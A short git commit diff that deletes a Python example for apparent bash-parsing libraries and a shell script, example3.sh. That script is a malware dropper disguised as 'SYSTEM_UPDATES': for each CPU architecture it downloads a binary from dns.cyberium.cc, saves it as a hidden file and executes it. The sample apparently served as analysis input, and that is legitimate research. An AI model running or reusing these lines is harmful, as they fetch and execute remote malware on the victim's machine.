fdd6d14ca10497733ebd0bfcbfd61ade7b6bb993
adam <spencerstingley6@gmail.com>
2021-12-21 14:27:08 -0800

    init migration 3.0

--- example.py
+++
@@ -1,7 +0,0 @@
-import bashparse, bashtemplate, bashunroll
-
-filename="example.sh"
-
-templates = bashtemplate.generate_templates_from_files(filename, {})
-
-print('templates: ', templates)
--- example3.sh
+++
@@ -1,9 +0,0 @@
-SYSTEM_UPDATES="arm arm5 arm6 arm7 mips mipsel x86 x86_64 powerpc"
-for update in $SYSTEM_UPDATES
-do
-    cd here
-    chmod 777 .h || chmod +x .h
-    wget http://dns.cyberium.cc/$update -O -> .h
-    chmod 777 .h || chmod +x .h
-    ./.h ssh
-done
